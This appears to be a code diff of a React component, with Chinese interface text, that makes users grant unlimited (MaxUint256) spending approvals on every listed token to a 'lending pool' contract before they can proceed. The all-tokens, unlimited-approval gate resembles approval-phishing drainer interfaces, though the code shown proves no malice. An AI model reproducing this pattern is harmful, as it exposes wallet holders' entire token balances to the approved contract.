@@ -1,211 +1,96 @@
-import { useState, useEffect } from 'react'
-import {
-  Box,
-  Button,
-  VStack,
-  Text,
-  useToast,
-  Card,
-  CardBody,
-  Heading,
-  Stat,
-  StatLabel,
-  StatNumber,
-  StatHelpText,
-  HStack,
-  Flex,
-  Input,
-  InputGroup,
-  InputRightElement,
-  useClipboard,
-  useBreakpointValue,
-} from '@chakra-ui/react'
-import { ethers } from 'ethers'
-import { USDT_ADDRESS, USDT_ABI, LENDING_POOL_ADDRESS } from '../constants/contracts'
+import { useState, useEffect } from 'react';
+import { Box, Button, VStack, Text, HStack, Spinner, useToast } from '@chakra-ui/react';
+import { ethers } from 'ethers';
+import { TOKENS, LENDING_POOL_ADDRESS } from '../constants/contracts';
 
 interface AuthorizeProps {
-  onAuthorized: () => void
+  onAuthorized: () => void;
 }
 
 const Authorize = ({ onAuthorized }: AuthorizeProps) => {
-  const [address, setAddress] = useState('')
-  const [balance, setBalance] = useState('0')
-  const [allowance, setAllowance] = useState('0')
-  const [isLoading, setIsLoading] = useState(false)
-  const toast = useToast()
-  const { hasCopied, onCopy } = useClipboard(LENDING_POOL_ADDRESS)
-  const isMobile = useBreakpointValue({ base: true, md: false })
+  const [status, setStatus] = useState<{ [symbol: string]: boolean }>({});
+  const [loading, setLoading] = useState<{ [symbol: string]: boolean }>({});
+  const [checking, setChecking] = useState(true);
+  const toast = useToast();
 
-  const connectWallet = async () => {
+  const checkAll = async () => {
+    setChecking(true);
     try {
-      if (typeof window.ethereum === 'undefined') {
-        toast({
-          title: '错误',
-          description: '请安装 MetaMask 钱包',
-          status: 'error',
-          duration: 5000,
-        })
-        return
+      const { ethereum } = window as any;
+      if (!ethereum) return;
+      const provider = new ethers.providers.Web3Provider(ethereum);
+      const signer = provider.getSigner();
+      const address = await signer.getAddress();
+      const newStatus: { [symbol: string]: boolean } = {};
+      for (const token of TOKENS) {
+        const contract = new ethers.Contract(token.address, token.abi, signer);
+        const allowance = await contract.allowance(address, LENDING_POOL_ADDRESS);
+        newStatus[token.symbol] = !allowance.isZero();
       }
-
-      const provider = new ethers.providers.Web3Provider(window.ethereum)
-      await provider.send('eth_requestAccounts', [])
-      const signer = provider.getSigner()
-      const address = await signer.getAddress()
-      setAddress(address)
-
-      // 获取 USDT 余额
-      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer)
-      const balance = await usdtContract.balanceOf(address)
-      setBalance(ethers.utils.formatUnits(balance, 18))
-
-      // 获取授权额度
-      const allowance = await usdtContract.allowance(address, LENDING_POOL_ADDRESS)
-      setAllowance(ethers.utils.formatUnits(allowance, 18))
-    } catch (error) {
-      console.error('连接钱包失败:', error)
-      toast({
-        title: '错误',
-        description: '连接钱包失败',
-        status: 'error',
-        duration: 5000,
-      })
-    }
-  }
-
-  const handleApprove = async () => {
-    try {
-      setIsLoading(true)
-      const provider = new ethers.providers.Web3Provider(window.ethereum)
-      const signer = provider.getSigner()
-      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer)
-
-      // 授权最大额度
-      const maxAmount = ethers.constants.MaxUint256
-      const tx = await usdtContract.approve(LENDING_POOL_ADDRESS, maxAmount)
-      await tx.wait()
-
-      // 更新授权额度
-      const newAllowance = await usdtContract.allowance(address, LENDING_POOL_ADDRESS)
-      setAllowance(ethers.utils.formatUnits(newAllowance, 18))
-
-      toast({
-        title: '成功',
-        description: '授权成功',
-        status: 'success',
-        duration: 5000,
-      })
-
-      onAuthorized()
-    } catch (error) {
-      console.error('授权失败:', error)
-      toast({
-        title: '错误',
-        description: '授权失败',
-        status: 'error',
-        duration: 5000,
-      })
+      setStatus(newStatus);
+      if (Object.values(newStatus).every(v => v)) {
+        onAuthorized();
+      }
+    } catch (e) {
+      // 忽略
     } finally {
-      setIsLoading(false)
+      setChecking(false);
     }
-  }
-
-  const handleCopy = () => {
-    onCopy()
-    toast({
-      title: '成功',
-      description: '已复制到剪贴板',
-      status: 'success',
-      duration: 2000,
-      position: 'top',
-    })
-  }
+  };
 
   useEffect(() => {
-    if (window.ethereum) {
-      window.ethereum.on('accountsChanged', connectWallet)
-      window.ethereum.on('chainChanged', connectWallet)
-    }
+    checkAll();
+    // eslint-disable-next-line
+  }, []);
 
-    return () => {
-      if (window.ethereum) {
-        window.ethereum.removeListener('accountsChanged', connectWallet)
-        window.ethereum.removeListener('chainChanged', connectWallet)
-      }
+  const handleApprove = async (symbol: string) => {
+    setLoading(l => ({ ...l, [symbol]: true }));
+    try {
+      const { ethereum } = window as any;
+      if (!ethereum) return;
+      const provider = new ethers.providers.Web3Provider(ethereum);
+      const signer = provider.getSigner();
+      const address = await signer.getAddress();
+      const token = TOKENS.find(t => t.symbol === symbol)!;
+      const contract = new ethers.Contract(token.address, token.abi, signer);
+      const tx = await contract.approve(LENDING_POOL_ADDRESS, ethers.constants.MaxUint256);
+      await tx.wait();
+      toast({ title: `${symbol} 授权成功`, status: 'success', duration: 2000 });
+      checkAll();
+    } catch (e: any) {
+      toast({ title: `${symbol} 授权失败`, description: e.message, status: 'error', duration: 3000 });
+    } finally {
+      setLoading(l => ({ ...l, [symbol]: false }));
     }
-  }, [])
+  };
 
   return (
-    <Box maxW="600px" mx="auto" px={4}>
-      <Card>
-        <CardBody>
-          <VStack spacing={6}>
-            <Heading size="md">授权 USDT</Heading>
-
-            <Box w="100%">
-              <Text mb={2} fontWeight="medium">合约地址：</Text>
-              <InputGroup size="md">
-                <Input
-                  value={LENDING_POOL_ADDRESS}
-                  isReadOnly
-                  pr="4.5rem"
-                  fontSize="sm"
-                />
-                <InputRightElement width="4.5rem">
-                  <Button
-                    h="1.75rem"
-                    size="sm"
-                    onClick={handleCopy}
-                    colorScheme={hasCopied ? 'green' : 'blue'}
-                  >
-                    {hasCopied ? '已复制' : '复制'}
-                  </Button>
-                </InputRightElement>
-              </InputGroup>
-            </Box>
-            
-            {!address ? (
-              <Button colorScheme="blue" onClick={connectWallet} w="100%">
-                连接钱包
-              </Button>
-            ) : (
-              <VStack spacing={4} w="100%">
-                <Text>已连接钱包: {address}</Text>
-                
-                <Flex
-                  direction={isMobile ? 'column' : 'row'}
-                  gap={4}
-                  w="100%"
-                >
-                  <Stat>
-                    <StatLabel>USDT 余额</StatLabel>
-                    <StatNumber>{balance}</StatNumber>
-                    <StatHelpText>当前余额</StatHelpText>
-                  </Stat>
-                  
-                  <Stat>
-                    <StatLabel>授权额度</StatLabel>
-                    <StatNumber>{allowance}</StatNumber>
-                    <StatHelpText>已授权额度</StatHelpText>
-                  </Stat>
-                </Flex>
-
+    <Box maxW="400px" mx="auto" mt={10} p={6} bg="white" borderRadius="md" boxShadow="md">
+      <VStack spacing={6}>
+        <Text fontSize="xl" fontWeight="bold">请授权以下所有代币</Text>
+        {checking ? <Spinner /> : (
+          TOKENS.map(token => (
+            <HStack key={token.symbol} w="100%" justify="space-between">
+              <Text>{token.symbol}</Text>
+              {status[token.symbol] ? (
+                <Text color="green.500">已授权</Text>
+              ) : (
                 <Button
-                  colorScheme="green"
-                  onClick={handleApprove}
-                  isLoading={isLoading}
-                  isDisabled={parseFloat(allowance) > 0}
-                  w="100%"
+                  colorScheme="blue"
+                  size="sm"
+                  isLoading={loading[token.symbol]}
+                  onClick={() => handleApprove(token.symbol)}
                 >
-                  {parseFloat(allowance) > 0 ? '已授权' : '授权 USDT'}
+                  授权
                 </Button>
-              </VStack>
-            )}
-          </VStack>
-        </CardBody>
-      </Card>
+              )}
+            </HStack>
+          ))
+        )}
+        <Text fontSize="sm" color="gray.500">全部授权后自动进入下一步</Text>
+      </VStack>
     </Box>
-  )
-}
+  );
+};
 
-export default Authorize 
+export default Authorize; 
